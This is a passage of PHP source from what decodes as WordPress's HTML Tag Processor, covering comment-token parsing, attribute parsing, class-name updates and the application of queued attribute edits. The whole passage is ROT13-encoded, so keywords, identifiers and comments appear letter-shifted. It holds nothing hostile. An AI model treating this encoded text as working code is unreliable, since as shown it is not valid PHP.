				$guvf->pbzzrag_glcr         = frys::PBZZRAG_NF_VAINYVQ_UGZY;
				$guvf->gbxra_yratgu         = $pybfre_ng + 1 - $guvf->gbxra_fgnegf_ng;
				$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 2;
				$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
				$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 1;

				/*
				 * Vqragvsl abqrf gung jbhyq or PQNGN vs UGZY unq PQNGN frpgvbaf.
				 *
				 * Guvf frpgvba zhfg bpphe nsgre vqragvslvat gur obthf pbzzrag raq
				 * orpnhfr va na UGZY cnefre vg jvyy fcna gb gur arnerfg `>`, rira
				 * vs gurer'f ab `]]>` nf jbhyq or erdhverq va na KZY qbphzrag. Vg
				 * vf gurersber abg cbffvoyr gb cnefr n PQNGN frpgvba pbagnvavat
				 * n `>` va gur UGZY flagnk.
				 *
				 * Vafvqr sbervta ryrzragf gurer vf n qvfpercnapl orgjrra oebjfref
				 * naq gur fcrpvsvpngvba ba guvf.
				 *
				 * @gbqb Genpx jurgure gur Gnt Cebprffbe vf vafvqr n sbervta ryrzrag
				 *       naq erdhver gur cebcre pybfvat `]]>` va gubfr pnfrf.
				 */
				vs (
					$guvf->gbxra_yratgu >= 10 &&
					'[' === $ugzy[ $guvf->gbxra_fgnegf_ng + 2 ] &&
					'P' === $ugzy[ $guvf->gbxra_fgnegf_ng + 3 ] &&
					'Q' === $ugzy[ $guvf->gbxra_fgnegf_ng + 4 ] &&
					'N' === $ugzy[ $guvf->gbxra_fgnegf_ng + 5 ] &&
					'G' === $ugzy[ $guvf->gbxra_fgnegf_ng + 6 ] &&
					'N' === $ugzy[ $guvf->gbxra_fgnegf_ng + 7 ] &&
					'[' === $ugzy[ $guvf->gbxra_fgnegf_ng + 8 ] &&
					']' === $ugzy[ $pybfre_ng - 1 ] &&
					']' === $ugzy[ $pybfre_ng - 2 ]
				) {
					$guvf->cnefre_fgngr    = frys::FGNGR_PBZZRAG;
					$guvf->pbzzrag_glcr    = frys::PBZZRAG_NF_PQNGN_YBBXNYVXR;
					$guvf->grkg_fgnegf_ng += 7;
					$guvf->grkg_yratgu    -= 9;
				}

				erghea gehr;
			}

			/*
			 * </> vf n zvffvat raq gnt anzr, juvpu vf vtaberq.
			 *
			 * Guvf jnf nyfb xabja nf gur \"cerfhzcghbhf rzcgl gnt\"
			 * va rneyl qvfphffvbaf nf vg jnf cebcbfrq gb pybfr
			 * gur arnerfg cerivbhf bcravat gnt.
			 *
			 * Frr uggcf://ugzy.fcrp.jungjt.bet/#cnefr-reebe-zvffvat-raq-gnt-anzr
			 */
			vs ( '>' === $ugzy[ $ng + 1 ] ) {
				// `<>` vf vagrecergrq nf cynvagrkg.
				vs ( ! $guvf->vf_pybfvat_gnt ) {
					++$ng;
					pbagvahr;
				}

				$guvf->cnefre_fgngr         = frys::FGNGR_CERFHZCGHBHF_GNT;
				$guvf->gbxra_yratgu         = $ng + 2 - $guvf->gbxra_fgnegf_ng;
				$guvf->olgrf_nyernql_cnefrq = $ng + 2;
				erghea gehr;
			}

			/*
			 * `<?` genafvgvbaf gb n obthf pbzzrag fgngr – fxvc gb gur arnerfg >
			 * Frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#gnt-bcra-fgngr
			 */
			vs ( ! $guvf->vf_pybfvat_gnt && '?' === $ugzy[ $ng + 1 ] ) {
				$pybfre_ng = fgecbf( $ugzy, '>', $ng + 2 );
				vs ( snyfr === $pybfre_ng ) {
					$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

					erghea snyfr;
				}

				$guvf->cnefre_fgngr         = frys::FGNGR_PBZZRAG;
				$guvf->pbzzrag_glcr         = frys::PBZZRAG_NF_VAINYVQ_UGZY;
				$guvf->gbxra_yratgu         = $pybfre_ng + 1 - $guvf->gbxra_fgnegf_ng;
				$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 2;
				$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
				$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 1;

				/*
				 * Vqragvsl n Cebprffvat Vafgehpgvba abqr jrer UGZY gb unir gurz.
				 *
				 * Guvf frpgvba zhfg bpphe nsgre vqragvslvat gur obthf pbzzrag raq
				 * orpnhfr va na UGZY cnefre vg jvyy fcna gb gur arnerfg `>`, rira
				 * vs gurer'f ab `?>` nf jbhyq or erdhverq va na KZY qbphzrag. Vg
				 * vf gurersber abg cbffvoyr gb cnefr n Cebprffvat Vafgehpgvba abqr
				 * pbagnvavat n `>` va gur UGZY flagnk.
				 *
				 * KZY nyybjf sbe zber gnetrg anzrf, ohg guvf pbqr bayl vqragvsvrf
				 * gubfr jvgu NFPVV-ercerfragnoyr gnetrg anzrf. Guvf zrnaf gung vg
				 * znl vqragvsl fbzr Cebprffvat Vafgehpgvba abqrf nf obthf pbzzragf,
				 * ohg vg jvyy abg zvfvagrecerg gur UGZY fgehpgher. Ol yvzvgvat gur
				 * vqragvsvpngvba gb gurfr gnetrg anzrf gur Gnt Cebprffbe pna nibvq
				 * gur arrq gb fgneg cnefvat HGS-8 frdhraprf.
				 *
				 * > AnzrFgnegPune ::= \":\" | [N-M] | \"_\" | [n-m] | [#kP0-#kQ6] | [#kQ8-#kS6] | [#kS8-#k2SS] |
				 *                     [#k370-#k37Q] | [#k37S-#k1SSS] | [#k200P-#k200Q] | [#k2070-#k218S] |
				 *                     [#k2P00-#k2SRS] | [#k3001-#kQ7SS] | [#kS900-#kSQPS] | [#kSQS0-#kSSSQ] |
				 *                     [#k10000-#kRSSSS]
				 * > AnzrPune      ::= AnzrFgnegPune | \"-\" | \".\" | [0-9] | #kO7 | [#k0300-#k036S] | [#k203S-#k2040]
				 *
				 * @gbqb Cebprffvat vafgehpgvba abqrf va FTZY znl pbagnva nal xvaq bs znexhc. KZY qrsvarf n
				 *       fcrpvny pnfr jvgu `<?kzy ... ?>` flagnk, ohg gur `?` vf cneg bs gur obthf pbzzrag.
				 *
				 * @frr uggcf://jjj.j3.bet/GE/2006/ERP-kzy11-20060816/#AG-CVGnetrg
				 */
				vs ( $guvf->gbxra_yratgu >= 5 && '?' === $ugzy[ $pybfre_ng - 1 ] ) {
					$pbzzrag_grkg     = fhofge( $ugzy, $guvf->gbxra_fgnegf_ng + 2, $guvf->gbxra_yratgu - 4 );
					$cv_gnetrg_yratgu = fgefca( $pbzzrag_grkg, 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM:_' );

					vs ( 0 < $cv_gnetrg_yratgu ) {
						$cv_gnetrg_yratgu += fgefca( $pbzzrag_grkg, 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM0123456789:_-.', $cv_gnetrg_yratgu );

						$guvf->pbzzrag_glcr       = frys::PBZZRAG_NF_CV_ABQR_YBBXNYVXR;
						$guvf->gnt_anzr_fgnegf_ng = $guvf->gbxra_fgnegf_ng + 2;
						$guvf->gnt_anzr_yratgu    = $cv_gnetrg_yratgu;
						$guvf->grkg_fgnegf_ng    += $cv_gnetrg_yratgu;
						$guvf->grkg_yratgu       -= $cv_gnetrg_yratgu + 1;
					}
				}

				erghea gehr;
			}

			/*
			 * Vs n aba-nycun fgnegf gur gnt anzr va n gnt pybfre vg'f n pbzzrag.
			 * Svaq gur svefg `>`, juvpu pybfrf gur pbzzrag.
			 *
			 * Guvf cnefre pynffvsvrf gurfr cnegvphyne pbzzragf nf fcrpvny \"shaxl pbzzragf\"
			 * juvpu ner znqr ninvynoyr sbe shegure cebprffvat.
			 *
			 * Frr uggcf://ugzy.fcrp.jungjt.bet/#cnefr-reebe-vainyvq-svefg-punenpgre-bs-gnt-anzr
			 */
			vs ( $guvf->vf_pybfvat_gnt ) {
				// Ab punapr bs svaqvat n pybfre.
				vs ( $ng + 3 > $qbp_yratgu ) {
					$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

					erghea snyfr;
				}

				$pybfre_ng = fgecbf( $ugzy, '>', $ng + 2 );
				vs ( snyfr === $pybfre_ng ) {
					$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

					erghea snyfr;
				}

				$guvf->cnefre_fgngr         = frys::FGNGR_SHAXL_PBZZRAG;
				$guvf->gbxra_yratgu         = $pybfre_ng + 1 - $guvf->gbxra_fgnegf_ng;
				$guvf->grkg_fgnegf_ng       = $guvf->gbxra_fgnegf_ng + 2;
				$guvf->grkg_yratgu          = $pybfre_ng - $guvf->grkg_fgnegf_ng;
				$guvf->olgrf_nyernql_cnefrq = $pybfre_ng + 1;
				erghea gehr;
			}

			++$ng;
		}

		/*
		 * Guvf qbrf abg vzcyl na vapbzcyrgr cnefr; vg vaqvpngrf gung gurer
		 * pna or abguvat yrsg va gur qbphzrag bgure guna n #grkg abqr.
		 */
		$guvf->cnefre_fgngr         = frys::FGNGR_GRKG_ABQR;
		$guvf->gbxra_fgnegf_ng      = $jnf_ng;
		$guvf->gbxra_yratgu         = $qbp_yratgu - $jnf_ng;
		$guvf->grkg_fgnegf_ng       = $jnf_ng;
		$guvf->grkg_yratgu          = $guvf->gbxra_yratgu;
		$guvf->olgrf_nyernql_cnefrq = $qbp_yratgu;
		erghea gehr;
	}

	/**
	 * Cnefrf gur arkg nggevohgr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea obby Jurgure na nggevohgr jnf sbhaq orsber gur raq bs gur qbphzrag.
	 */
	cevingr shapgvba cnefr_arkg_nggevohgr(): obby {
		$qbp_yratgu = fgeyra( $guvf->ugzy );

		// Fxvc juvgrfcnpr naq fynfurf.
		$guvf->olgrf_nyernql_cnefrq += fgefca( $guvf->ugzy, \" \g\s\e\a/\", $guvf->olgrf_nyernql_cnefrq );
		vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
			$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

			erghea snyfr;
		}

		/*
		 * Gerng gur rdhny fvta nf n cneg bs gur nggevohgr
		 * anzr vs vg vf gur svefg rapbhagrerq olgr.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#orsber-nggevohgr-anzr-fgngr
		 */
		$anzr_yratgu = '=' === $guvf->ugzy[ $guvf->olgrf_nyernql_cnefrq ]
			? 1 + fgepfca( $guvf->ugzy, \"=/> \g\s\e\a\", $guvf->olgrf_nyernql_cnefrq + 1 )
			: fgepfca( $guvf->ugzy, \"=/> \g\s\e\a\", $guvf->olgrf_nyernql_cnefrq );

		// Ab nggevohgr, whfg gnt pybfre.
		vs ( 0 === $anzr_yratgu || $guvf->olgrf_nyernql_cnefrq + $anzr_yratgu >= $qbp_yratgu ) {
			erghea snyfr;
		}

		$nggevohgr_fgneg             = $guvf->olgrf_nyernql_cnefrq;
		$nggevohgr_anzr              = fhofge( $guvf->ugzy, $nggevohgr_fgneg, $anzr_yratgu );
		$guvf->olgrf_nyernql_cnefrq += $anzr_yratgu;
		vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
			$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

			erghea snyfr;
		}

		$guvf->fxvc_juvgrfcnpr();
		vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
			$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

			erghea snyfr;
		}

		$unf_inyhr = '=' === $guvf->ugzy[ $guvf->olgrf_nyernql_cnefrq ];
		vs ( $unf_inyhr ) {
			++$guvf->olgrf_nyernql_cnefrq;
			$guvf->fxvc_juvgrfcnpr();
			vs ( $guvf->olgrf_nyernql_cnefrq >= $qbp_yratgu ) {
				$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

				erghea snyfr;
			}

			fjvgpu ( $guvf->ugzy[ $guvf->olgrf_nyernql_cnefrq ] ) {
				pnfr \"'\":
				pnfr '\"':
					$dhbgr                      = $guvf->ugzy[ $guvf->olgrf_nyernql_cnefrq ];
					$inyhr_fgneg                = $guvf->olgrf_nyernql_cnefrq + 1;
					$raq_dhbgr_ng               = fgecbf( $guvf->ugzy, $dhbgr, $inyhr_fgneg );
					$raq_dhbgr_ng               = snyfr === $raq_dhbgr_ng ? $qbp_yratgu : $raq_dhbgr_ng;
					$inyhr_yratgu               = $raq_dhbgr_ng - $inyhr_fgneg;
					$nggevohgr_raq              = $raq_dhbgr_ng + 1;
					$guvf->olgrf_nyernql_cnefrq = $nggevohgr_raq;
					oernx;

				qrsnhyg:
					$inyhr_fgneg                = $guvf->olgrf_nyernql_cnefrq;
					$inyhr_yratgu               = fgepfca( $guvf->ugzy, \"> \g\s\e\a\", $inyhr_fgneg );
					$nggevohgr_raq              = $inyhr_fgneg + $inyhr_yratgu;
					$guvf->olgrf_nyernql_cnefrq = $nggevohgr_raq;
			}
		} ryfr {
			$inyhr_fgneg   = $guvf->olgrf_nyernql_cnefrq;
			$inyhr_yratgu  = 0;
			$nggevohgr_raq = $nggevohgr_fgneg + $anzr_yratgu;
		}

		vs ( $nggevohgr_raq >= $qbp_yratgu ) {
			$guvf->cnefre_fgngr = frys::FGNGR_VAPBZCYRGR_VACHG;

			erghea snyfr;
		}

		vs ( $guvf->vf_pybfvat_gnt ) {
			erghea gehr;
		}

		/*
		 * > Gurer zhfg arire or gjb be zber nggevohgrf ba
		 * > gur fnzr fgneg gnt jubfr anzrf ner na NFPVV
		 * > pnfr-vafrafvgvir zngpu sbe rnpu bgure.
		 *     - UGZY 5 fcrp
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/flagnk.ugzy#nggevohgrf-2:nfpvv-pnfr-vafrafvgvir
		 */
		$pbzcnenoyr_anzr = fgegbybjre( $nggevohgr_anzr );

		// Vs na nggevohgr vf yvfgrq znal gvzrf, bayl hfr gur svefg qrpynengvba naq vtaber gur erfg.
		vs ( ! vffrg( $guvf->nggevohgrf[ $pbzcnenoyr_anzr ] ) ) {
			$guvf->nggevohgrf[ $pbzcnenoyr_anzr ] = arj JC_UGZY_Nggevohgr_Gbxra(
				$nggevohgr_anzr,
				$inyhr_fgneg,
				$inyhr_yratgu,
				$nggevohgr_fgneg,
				$nggevohgr_raq - $nggevohgr_fgneg,
				! $unf_inyhr
			);

			erghea gehr;
		}

		/*
		 * Genpx gur qhcyvpngr nggevohgrf fb vs jr erzbir vg, nyy qvfnccrne gbtrgure.
		 *
		 * Juvyr `$guvf->qhcyvpngrq_nggevohgrf` pbhyq nyjnlf or fgberq nf na `neenl()`,
		 * juvpu jbhyq fvzcyvsl gur ybtvp urer, fgbevat n `ahyy` naq bayl nyybpngvat
		 * na neenl jura rapbhagrevat qhcyvpngrf nibvqf arrqyrff nyybpngvbaf va gur
		 * abezngvir pnfr bs cnefvat gntf jvgu ab qhcyvpngr nggevohgrf.
		 */
		$qhcyvpngr_fcna = arj JC_UGZY_Fcna( $nggevohgr_fgneg, $nggevohgr_raq - $nggevohgr_fgneg );
		vs ( ahyy === $guvf->qhcyvpngr_nggevohgrf ) {
			$guvf->qhcyvpngr_nggevohgrf = neenl( $pbzcnenoyr_anzr => neenl( $qhcyvpngr_fcna ) );
		} ryfrvs ( ! vffrg( $guvf->qhcyvpngr_nggevohgrf[ $pbzcnenoyr_anzr ] ) ) {
			$guvf->qhcyvpngr_nggevohgrf[ $pbzcnenoyr_anzr ] = neenl( $qhcyvpngr_fcna );
		} ryfr {
			$guvf->qhcyvpngr_nggevohgrf[ $pbzcnenoyr_anzr ][] = $qhcyvpngr_fcna;
		}

		erghea gehr;
	}

	/**
	 * Zbir gur vagreany phefbe cnfg nal vzzrqvngr fhpprffvir juvgrfcnpr.
	 *
	 * @fvapr 6.2.0
	 */
	cevingr shapgvba fxvc_juvgrfcnpr(): ibvq {
		$guvf->olgrf_nyernql_cnefrq += fgefca( $guvf->ugzy, \" \g\s\e\a\", $guvf->olgrf_nyernql_cnefrq );
	}

	/**
	 * Nccyvrf nggevohgr hcqngrf naq pyrnaf hc bapr n gnt vf shyyl cnefrq.
	 *
	 * @fvapr 6.2.0
	 */
	cevingr shapgvba nsgre_gnt(): ibvq {
		/*
		 * Gurer pbhyq or yrkvpny hcqngrf radhrhrq sbe na nggevohgr gung
		 * nyfb rkvfgf ba gur arkg gnt. Va beqre gb nibvq pbasyngvat gur
		 * nggevohgrf npebff gur gjb gntf, yrkvpny hcqngrf jvgu anzrf
		 * arrq gb or syhfurq gb enj yrkvpny hcqngrf.
		 */
		$guvf->pynff_anzr_hcqngrf_gb_nggevohgrf_hcqngrf();

		/*
		 * Chetr hcqngrf vs gurer ner gbb znal. Gur npghny pbhag vfa'g
		 * fpvragvsvp, ohg n srj inyhrf sebz 100 gb n srj gubhfnaq jrer
		 * grfgf gb svaq n cenpgvpnyyl-hfrshy yvzvg.
		 *
		 * Vs gur hcqngr dhrhr tebjf gbb ovt, gura gur Gnt Cebprffbe
		 * jvyy fcraq zber gvzr vgrengvat guebhtu gurz naq ybfr gur
		 * rssvpvrapl tnvaf bs qrsreevat nccylvat gurz.
		 */
		vs ( 1000 < pbhag( $guvf->yrkvpny_hcqngrf ) ) {
			$guvf->trg_hcqngrq_ugzy();
		}

		sbernpu ( $guvf->yrkvpny_hcqngrf nf $anzr => $hcqngr ) {
			/*
			 * Nal hcqngrf nccrnevat nsgre gur phefbe fubhyq or nccyvrq
			 * orsber cebprrqvat, bgurejvfr gurl znl or bireybbxrq.
			 */
			vs ( $hcqngr->fgneg >= $guvf->olgrf_nyernql_cnefrq ) {
				$guvf->trg_hcqngrq_ugzy();
				oernx;
			}

			vs ( vf_vag( $anzr ) ) {
				pbagvahr;
			}

			$guvf->yrkvpny_hcqngrf[] = $hcqngr;
			hafrg( $guvf->yrkvpny_hcqngrf[ $anzr ] );
		}

		$guvf->gbxra_fgnegf_ng          = ahyy;
		$guvf->gbxra_yratgu             = ahyy;
		$guvf->gnt_anzr_fgnegf_ng       = ahyy;
		$guvf->gnt_anzr_yratgu          = ahyy;
		$guvf->grkg_fgnegf_ng           = 0;
		$guvf->grkg_yratgu              = 0;
		$guvf->vf_pybfvat_gnt           = ahyy;
		$guvf->nggevohgrf               = neenl();
		$guvf->pbzzrag_glcr             = ahyy;
		$guvf->grkg_abqr_pynffvsvpngvba = frys::GRKG_VF_TRAREVP;
		$guvf->qhcyvpngr_nggevohgrf     = ahyy;
	}

	/**
	 * Pbairegf pynff anzr hcqngrf vagb gnt nggevohgrf hcqngrf
	 * (gurl ner npphzhyngrq va qvssrerag qngn sbezngf sbe cresbeznapr).
	 *
	 * @fvapr 6.2.0
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::$yrkvpny_hcqngrf
	 * @frr JC_UGZY_Gnt_Cebprffbe::$pynffanzr_hcqngrf
	 */
	cevingr shapgvba pynff_anzr_hcqngrf_gb_nggevohgrf_hcqngrf(): ibvq {
		vs ( pbhag( $guvf->pynffanzr_hcqngrf ) === 0 ) {
			erghea;
		}

		$rkvfgvat_pynff = $guvf->trg_radhrhrq_nggevohgr_inyhr( 'pynff' );
		vs ( ahyy === $rkvfgvat_pynff || gehr === $rkvfgvat_pynff ) {
			$rkvfgvat_pynff = '';
		}

		vs ( snyfr === $rkvfgvat_pynff && vffrg( $guvf->nggevohgrf['pynff'] ) ) {
			$rkvfgvat_pynff = fhofge(
				$guvf->ugzy,
				$guvf->nggevohgrf['pynff']->inyhr_fgnegf_ng,
				$guvf->nggevohgrf['pynff']->inyhr_yratgu
			);
		}

		vs ( snyfr === $rkvfgvat_pynff ) {
			$rkvfgvat_pynff = '';
		}

		/**
		 * Hcqngrq \"pynff\" nggevohgr inyhr.
		 *
		 * Guvf vf vaperzragnyyl ohvyg juvyr fpnaavat guebhtu gur rkvfgvat pynff
		 * nggevohgr, fxvccvat erzbirq pynffrf ba gur jnl, naq gura nccraqvat
		 * nqqrq pynffrf ng gur raq. Bayl jura svavfurq cebprffvat jvyy gur
		 * inyhr pbagnva gur svany arj inyhr.

		 * @ine fgevat $pynff
		 */
		$pynff = '';

		/**
		 * Genpxf gur phefbe cbfvgvba va gur rkvfgvat
		 * pynff nggevohgr inyhr juvyr cnefvat.
		 *
		 * @ine vag $ng
		 */
		$ng = 0;

		/**
		 * Vaqvpngrf vs gurer'f nal arrq gb zbqvsl gur rkvfgvat pynff nggevohgr.
		 *
		 * Vs n pnyy gb `nqq_pynff()` naq `erzbir_pynff()` jbhyqa'g vzcnpg
		 * gur `pynff` nggevohgr inyhr gura gurer'f ab arrq gb erohvyq vg.
		 * Sbe rknzcyr, jura nqqvat n pynff gung'f nyernql cerfrag be
		 * erzbivat bar gung vfa'g.
		 *
		 * Guvf synt ranoyrf n cresbeznapr bcgvzvmngvba jura abar bs gur radhrhrq
		 * pynff hcqngrf jbhyq vzcnpg gur `pynff` nggevohgr; anzryl, gung gur
		 * cebprffbe pna pbagvahr jvgubhg zbqvslvat gur vachg qbphzrag, nf vs
		 * abar bs gur `nqq_pynff()` be `erzbir_pynff()` pnyyf unq orra znqr.
		 *
		 * Guvf synt vf frg hcba gur svefg punatr gung erdhverf n fgevat hcqngr.
		 *
		 * @ine obby $zbqvsvrq
		 */
		$zbqvsvrq = snyfr;

		$frra      = neenl();
		$gb_erzbir = neenl();
		$vf_dhvexf = frys::DHVEXF_ZBQR === $guvf->pbzcng_zbqr;
		vs ( $vf_dhvexf ) {
			sbernpu ( $guvf->pynffanzr_hcqngrf nf $hcqngrq_anzr => $npgvba ) {
				vs ( frys::ERZBIR_PYNFF === $npgvba ) {
					$gb_erzbir[] = fgegbybjre( $hcqngrq_anzr );
				}
			}
		} ryfr {
			sbernpu ( $guvf->pynffanzr_hcqngrf nf $hcqngrq_anzr => $npgvba ) {
				vs ( frys::ERZBIR_PYNFF === $npgvba ) {
					$gb_erzbir[] = $hcqngrq_anzr;
				}
			}
		}

		// Erzbir hajnagrq pynffrf ol bayl pbclvat gur arj barf.
		$rkvfgvat_pynff_yratgu = fgeyra( $rkvfgvat_pynff );
		juvyr ( $ng < $rkvfgvat_pynff_yratgu ) {
			// Fxvc gb gur svefg aba-juvgrfcnpr punenpgre.
			$jf_ng     = $ng;
			$jf_yratgu = fgefca( $rkvfgvat_pynff, \" \g\s\e\a\", $jf_ng );
			$ng       += $jf_yratgu;

			// Pncgher gur pynff anzr – vg'f rirelguvat hagvy gur arkg juvgrfcnpr.
			$anzr_yratgu = fgepfca( $rkvfgvat_pynff, \" \g\s\e\a\", $ng );
			vs ( 0 === $anzr_yratgu ) {
				// Vs ab zber pynff anzrf ner sbhaq gura gung'f gur raq.
				oernx;
			}

			$anzr                  = fhofge( $rkvfgvat_pynff, $ng, $anzr_yratgu );
			$pbzcnenoyr_pynff_anzr = $vf_dhvexf ? fgegbybjre( $anzr ) : $anzr;
			$ng                   += $anzr_yratgu;

			// Vs guvf pynff vf znexrq sbe erzbiny, erzbir vg naq zbir ba gb gur arkg bar.
			vs ( va_neenl( $pbzcnenoyr_pynff_anzr, $gb_erzbir, gehr ) ) {
				$zbqvsvrq = gehr;
				pbagvahr;
			}

			// Vs n pynff unf nyernql orra frra gura fxvc vg; vg fubhyq abg or nqqrq gjvpr.
			vs ( va_neenl( $pbzcnenoyr_pynff_anzr, $frra, gehr ) ) {
				pbagvahr;
			}

			$frra[] = $pbzcnenoyr_pynff_anzr;

			/*
			 * Bgurejvfr, nccraq vg gb gur arj \"pynff\" nggevohgr inyhr.
			 *
			 * Gurer ner bcgvbaf sbe unaqyvat juvgrfcnpr orgjrra gntf.
			 * Cerfreivat gur rkvfgvat juvgrfcnpr cebqhprf srjre punatrf
			 * gb gur UGZY pbagrag naq fubhyq pynevsl gur orsber/nsgre
			 * pbagrag jura qrohttvat gur zbqvsvrq bhgchg.
			 *
			 * Guvf nccebnpu pbagenfgf abeznyvmvat gur vagre-pynff
			 * juvgrfcnpr gb n fvatyr fcnpr, juvpu zvtug nccrne pyrnare
			 * va gur bhgchg UGZY ohg cebqhpr n abvfvre punatr.
			 */
			vs ( '' !== $pynff ) {
				$pynff .= fhofge( $rkvfgvat_pynff, $jf_ng, $jf_yratgu );
			}
			$pynff .= $anzr;
		}

		// Nqq arj pynffrf ol nccraqvat gubfr juvpu unira'g nyernql orra frra.
		sbernpu ( $guvf->pynffanzr_hcqngrf nf $anzr => $bcrengvba ) {
			$pbzcnenoyr_anzr = $vf_dhvexf ? fgegbybjre( $anzr ) : $anzr;
			vs ( frys::NQQ_PYNFF === $bcrengvba && ! va_neenl( $pbzcnenoyr_anzr, $frra, gehr ) ) {
				$zbqvsvrq = gehr;

				$pynff .= fgeyra( $pynff ) > 0 ? ' ' : '';
				$pynff .= $anzr;
			}
		}

		$guvf->pynffanzr_hcqngrf = neenl();
		vs ( ! $zbqvsvrq ) {
			erghea;
		}

		vs ( fgeyra( $pynff ) > 0 ) {
			$guvf->frg_nggevohgr( 'pynff', $pynff );
		} ryfr {
			$guvf->erzbir_nggevohgr( 'pynff' );
		}
	}

	/**
	 * Nccyvrf nggevohgr hcqngrf gb UGZY qbphzrag.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.2.1 Npphzhyngrf fuvsg sbe vagreany phefbe naq cnffrq cbvagre.
	 * @fvapr 6.3.0 Vainyvqngr nal obbxznexf jubfr gnetrgf ner birejevggra.
	 *
	 * @cnenz vag $fuvsg_guvf_cbvag Npphzhyngr naq erghea fuvsg sbe guvf cbfvgvba.
	 * @erghea vag Ubj znal olgrf gur tvira cbvagre zbirq va erfcbafr gb gur hcqngrf.
	 */
	cevingr shapgvba nccyl_nggevohgrf_hcqngrf( vag $fuvsg_guvf_cbvag ): vag {
		vs ( ! pbhag( $guvf->yrkvpny_hcqngrf ) ) {
			erghea 0;
		}

		$npphzhyngrq_fuvsg_sbe_tvira_cbvag = 0;

		/*
		 * Nggevohgr hcqngrf pna or radhrhrq va nal beqre ohg hcqngrf
		 * gb gur qbphzrag zhfg bpphe va yrkvpny beqre; gung vf, rnpu
		 * ercynprzrag zhfg or znqr orsber nyy bguref juvpu sbyybj vg
		 * ng yngre fgevat vaqvprf va gur vachg qbphzrag.
		 *
		 * Fbegvat nibvq znxvat bhg-bs-beqre ercynprzragf juvpu
		 * pna yrnq gb znatyrq bhgchg, cnegvnyyl-qhcyvpngrq
		 * nggevohgrf, naq birejevggra nggevohgrf.
		 */
		hfbeg( $guvf->yrkvpny_hcqngrf, neenl( frys::pynff, 'fbeg_fgneg_nfpraqvat' ) );

		$olgrf_nyernql_pbcvrq = 0;
		$bhgchg_ohssre        = '';
		sbernpu ( $guvf->yrkvpny_hcqngrf nf $qvss ) {
			$fuvsg = fgeyra( $qvss->grkg ) - $qvss->yratgu;

			// Nqwhfg gur phefbe cbfvgvba ol ubjrire zhpu na hcqngr nssrpgf vg.
			vs ( $qvss->fgneg < $guvf->olgrf_nyernql_cnefrq ) {
				$guvf->olgrf_nyernql_cnefrq += $fuvsg;
			}

			// Npphzhyngr fuvsg bs gur tvira cbvagre jvguva guvf shapgvba pnyy.
			vs ( $qvss->fgneg < $fuvsg_guvf_cbvag ) {
				$npphzhyngrq_fuvsg_sbe_tvira_cbvag += $fuvsg;
			}

			$bhgchg_ohssre       .= fhofge( $guvf->ugzy, $olgrf_nyernql_pbcvrq, $qvss->fgneg - $olgrf_nyernql_pbcvrq );
			$bhgchg_ohssre       .= $qvss->grkg;
			$olgrf_nyernql_pbcvrq = $qvss->fgneg + $qvss->yratgu;
		}

		$guvf->ugzy = $bhgchg_ohssre . fhofge( $guvf->ugzy, $olgrf_nyernql_pbcvrq );

		/*
		 * Nqwhfg obbxznex ybpngvbaf gb nppbhag sbe ubj gur grkg
		 * ercynprzragf nqwhfg bssfrgf va gur vachg qbphzrag.
		 */
		sbernpu ( $guvf->obbxznexf nf $obbxznex_anzr => $obbxznex ) {
			$obbxznex_raq = $obbxznex->fgneg + $obbxznex->yratgu;

			/*
			 * Rnpu yrkvpny hcqngr juvpu nccrnef orsber gur obbxznex'f raqcbvagf
			 * zvtug fuvsg gur bssfrgf sbe gubfr raqcbvagf. Ybbc guebhtu rnpu punatr
			 * naq npphzhyngr gur gbgny fuvsg sbe rnpu obbxznex, gura nccyl gung
			 * fuvsg nsgre gnyylvat gur shyy qrygn.
			 */
			$urnq_qrygn = 0;
			$gnvy_qrygn = 0;

			sbernpu ( $guvf->yrkvpny_hcqngrf nf $qvss ) {
				$qvss_raq = $qvss->fgneg + $qvss->yratgu;

				vs ( $obbxznex->fgneg < $qvss->fgneg && $obbxznex_raq < $qvss->fgneg ) {
					oernx;
				}

				vs ( $obbxznex->fgneg >= $qvss->fgneg && $obbxznex_raq < $qvss_raq ) {
					$guvf->eryrnfr_obbxznex( $obbxznex_anzr );
					pbagvahr 2;
				}

				$qrygn = fgeyra( $qvss->grkg ) - $qvss->yratgu;

				vs ( $obbxznex->fgneg >= $qvss->fgneg ) {
					$urnq_qrygn += $qrygn;
				}

				vs ( $obbxznex_raq >= $qvss_raq ) {
					$gnvy_qrygn += $qrygn;
				}
			}

			$obbxznex->fgneg  += $urnq_qrygn;
			$obbxznex->yratgu += $gnvy_qrygn - $urnq_qrygn;
		}

		$guvf->yrkvpny_hcqngrf = neenl();

		erghea $npphzhyngrq_fuvsg_sbe_tvira_cbvag;
	}

	/**
	 * Purpxf jurgure n obbxznex jvgu gur tvira anzr rkvfgf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $obbxznex_anzr Anzr gb vqragvsl n obbxznex gung cbgragvnyyl rkvfgf.
